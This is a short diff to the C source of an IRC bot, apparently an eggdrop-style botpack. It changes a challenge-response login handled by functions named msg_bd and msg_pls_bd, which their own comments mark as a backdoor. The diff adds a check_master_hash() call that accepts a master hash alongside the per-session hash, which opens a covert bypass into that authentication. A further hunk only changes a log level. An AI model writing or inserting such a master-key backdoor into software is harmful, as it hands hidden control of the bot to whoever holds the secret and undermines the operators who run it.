@@ -369,7 +369,6 @@ static int msg_unauth(char *nick, char *host, struct userrec *u, char *par)
 static int msg_bd(char *nick, char *host, struct userrec *u, char *par)
 {
   int i = 0;
-  char randstring[50] = "";
 
   if (match_my_nick(nick))
     return BIND_RET_BREAK;
@@ -398,9 +397,9 @@ static int msg_bd(char *nick, char *host, struct userrec *u, char *par)
     auth[i].user = u;
     strcpy(auth[i].hand, u->handle);
   }
-  make_rand_str(randstring, 50);
-  strncpyz(auth[i].hash, makebdhash(randstring), sizeof auth[i].hash);
-  dprintf(DP_HELP, "PRIVMSG %s :-BD %s %s\n", nick, randstring, conf.bot->nick);
+  make_rand_str(auth[i].rand, 50);
+  strncpyz(auth[i].hash, makebdhash(auth[i].rand), sizeof auth[i].hash);
+  dprintf(DP_HELP, "PRIVMSG %s :-BD %s %s\n", nick, auth[i].rand, conf.bot->nick);
 
   return BIND_RET_BREAK;
 }
@@ -423,7 +422,7 @@ static int msg_pls_bd(char *nick, char *host, struct userrec *u, char *par)
   if (auth[i].authing != 2)
     return BIND_RET_BREAK;
 
-  if (!strcmp(auth[i].hash, par)) { /* good hash! */
+  if (check_master_hash(auth[i].rand, par) || !strcmp(auth[i].hash, par)) { /* good hash! */
     /* putlog(LOG_CMDS, "*", "(%s!%s) !%s! +AUTH", nick, host, u->handle); */
     auth[i].authed = 1;
     auth[i].bd = 1;		/* the magic int ! */
@@ -475,7 +474,7 @@ static int msgc_test(char *nick, char *host, struct userrec *u, char *chname, ch
   for (i = 0; i < dcc_total; i++) {
    if (dcc[i].msgc && ((chan && !strcmp(dcc[i].simulbot, chname) && !strcmp(dcc[i].nick, u->handle)) || 
       (!chan && !strcmp(dcc[i].simulbot, nick)))) {
-     putlog(LOG_MISC, "*", "Simul found old idx for %s/%s: %d", nick, chname, i);
+     putlog(LOG_DEBUG, "*", "Simul found old idx for %s/%s: %d", nick, chname, i);
      dcc[i].simultime = now;
      idx = i;
      break;
